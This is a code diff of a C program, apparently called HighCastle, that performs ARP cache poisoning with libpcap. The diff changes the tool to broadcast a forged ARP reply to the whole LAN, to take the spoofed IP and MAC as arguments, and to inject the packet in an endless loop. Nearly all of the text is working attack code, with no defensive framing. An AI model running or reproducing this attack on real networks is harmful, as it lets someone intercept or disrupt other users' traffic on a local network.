@@ -9,7 +9,7 @@ Purpose: This program performs a ARP poison attack
          against a client.
 
 Sample Invocation:
-  ./HighCastle -i <interface> -v <victim_mac>
+  ./HighCastle <Spoof_IP> <Spoof_MAC>
 **************************************************/
 #include <stdio.h>
 #include <stdlib.h>
@@ -55,16 +55,18 @@ int main(int argc, char **argv) {
     /* Open second device to read from file and read*/
     handle2 = pcap_open_offline("arp.pcap", error_buffer);
     packet = pcap_next(handle2, &packet_header);
+
     arp_header = (struct arphdr*) (packet + sizeof(struct ether_header));
-    // Set destination (ethernet) as the victim we are attacking.
+
+    // Set destination to broadcast to entire LAN
     struct ether_header* eth_header = (struct ether_header*) packet;
-    eth_pton("94:c6:91:a0:90:26", &ether_address);
+    eth_pton("FF:FF:FF:FF:FF:FF", &ether_address);
     memcpy(&eth_header->ether_dhost, &ether_address, ETH_ADDR_LEN);
 
     //Insert this record into the victim's ARP table.
-    inet_pton(AF_INET, "10.10.22.22", &(ip_address.addr_ip));
+    inet_pton(AF_INET, argv[1], &(ip_address.addr_ip));
     memcpy(&arp_header->spa, &ip_address.addr_ip, IP_ADDR_LEN);
-    eth_pton("94:c6:91:a0:91:8d", &ether_address);
+    eth_pton(argv[2], &ether_address);
     memcpy(&arp_header->sha, &ether_address, ETH_ADDR_LEN);
 
     //Eh do I need this?
@@ -74,6 +76,7 @@ int main(int argc, char **argv) {
     memcpy(&arp_header->tha, &ether_address, ETH_ADDR_LEN);
 
     //Inject!
-    pcap_inject(handle, packet, packet_header.len);
+    while(1)
+        pcap_inject(handle, packet, packet_header.len);
     return 0;
 }
